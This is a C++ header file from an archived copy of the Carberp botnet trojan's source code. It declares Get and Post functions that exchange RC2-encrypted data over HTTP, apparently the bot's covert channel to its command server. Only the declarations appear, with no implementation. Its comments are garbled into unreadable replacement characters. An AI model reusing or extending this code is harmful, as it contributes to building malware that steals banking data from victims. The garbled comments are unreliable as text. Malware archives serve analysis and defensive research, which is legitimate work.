/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//***************************************************************************
//
//  ������ �������� ����������� ����� ������� ���� � ��������
//
//***************************************************************************



//---------------------------------------------------------------------------

#ifndef CryptHTTPH
#define CryptHTTPH
//---------------------------------------------------------------------------

#include <windows.h>
#include "Strings.h"
#include "BotHTTP.h"


//****************************************************************************
//  CryptHTTP -  ������ ������������ ������ � HTTP ��������
//  ��� ���������� ������������ RC2Crypt
//****************************************************************************

namespace CryptHTTP
{
	// ��������� ����������� ��������
	bool Get(PCHAR URL, PCHAR Password, PCHAR *Buf, PHTTPResponse Response, bool MultiLineBuffer = false);

	// ������� ���������� ������������� ���� ������ �� ���������
	// �����. ���� ������ �� ���������� �������� ����
	bool Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf, PHTTPResponse Response, bool MultiLineBuffer = false);
}

//---------------------------------------------------------------------------
#endif
